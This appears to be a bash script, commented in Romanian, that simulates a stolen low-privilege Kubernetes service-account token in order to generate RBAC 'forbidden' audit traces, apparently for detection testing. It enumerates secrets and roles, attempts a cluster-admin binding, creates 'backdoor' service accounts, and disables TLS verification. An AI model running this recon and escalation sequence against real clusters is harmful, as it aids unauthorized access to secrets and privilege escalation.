#!/bin/bash
# Acces inițial REALIST (#5): SA compromis cu drepturi mici -> recon cu token-ul furat -> URMĂ DE FORBID.
# Spre deosebire de actorii dinainte (porneau cu cluster-admin), aici atacatorul are un token furat slab,
# iar recon-ul produce natural multe 'forbid' (403) = semnătura reală de probing RBAC (vizibilă în authz.decision).
set -uo pipefail
ROUNDS="${ROUNDS:-8}"
kubectl create serviceaccount victim-sa -n default >/dev/null 2>&1 || true
kubectl create role pod-reader --verb=get,list --resource=pods -n default >/dev/null 2>&1 || true
kubectl create rolebinding victim-rb --role=pod-reader --serviceaccount=default:victim-sa -n default >/dev/null 2>&1 || true
TOKEN="$(kubectl create token victim-sa -n default --duration=2h)"
SERVER="$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')"
# kubeconfig DOAR cu token (fără certificat de admin — altfel kubectl folosește admin-ul!)
KC=/tmp/victim.kubeconfig
kubectl config --kubeconfig="$KC" set-cluster aks --server="$SERVER" --insecure-skip-tls-verify=true >/dev/null
kubectl config --kubeconfig="$KC" set-credentials victim --token="$TOKEN" >/dev/null
kubectl config --kubeconfig="$KC" set-context aks --cluster=aks --user=victim >/dev/null
kubectl config --kubeconfig="$KC" use-context aks >/dev/null
A(){ kubectl --kubeconfig="$KC" "$@" >/dev/null 2>&1 || true; }

echo "ATTACK_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
for r in $(seq 1 "$ROUNDS"); do
  # recon cu token furat slab -> majoritatea FORBIDDEN
  A get secrets -A; A get clusterroles; A get clusterrolebindings; A get serviceaccounts -A
  A get pods -A; A get secret -n kube-system; A get roles -A; A get rolebindings -A
  A create clusterrolebinding evil-$r --clusterrole=cluster-admin --serviceaccount=default:victim-sa  # forbidden (escaladare)
  A create serviceaccount backdoor-$r -n kube-system   # forbidden
  # ce ARE voie (recon care reușește) -> allow
  A get pods -n default
  echo "   recon furat $r/$ROUNDS"
done
echo "ATTACK_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

kubectl delete rolebinding victim-rb -n default >/dev/null 2>&1 || true
kubectl delete role pod-reader -n default >/dev/null 2>&1 || true
kubectl delete serviceaccount victim-sa -n default >/dev/null 2>&1 || true
echo "GATA atac realist (urmă de forbid)."